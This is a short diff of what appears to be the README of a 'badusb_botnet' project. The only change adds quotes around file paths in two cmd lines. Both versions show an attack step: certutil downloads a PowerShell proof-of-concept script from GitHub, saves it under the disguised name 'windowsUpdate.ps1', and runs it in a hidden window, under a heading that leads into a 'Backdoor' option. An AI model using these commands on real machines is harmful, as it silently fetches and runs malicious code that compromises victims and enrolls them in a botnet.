@@ -96,8 +96,8 @@ Windows Powershell is too slow at startup, so we can use cmd to download the '.p
 ### Option 2.1: Simple
 
 ```cmd
-> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
-> powershell.exe -windowstyle hidden -file Documents\windowsUpdate.ps1
+> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"
+> powershell.exe -windowstyle hidden -file "Documents/windowsUpdate.ps1"
 ```
 
 ### Option 2.2: Backdoor
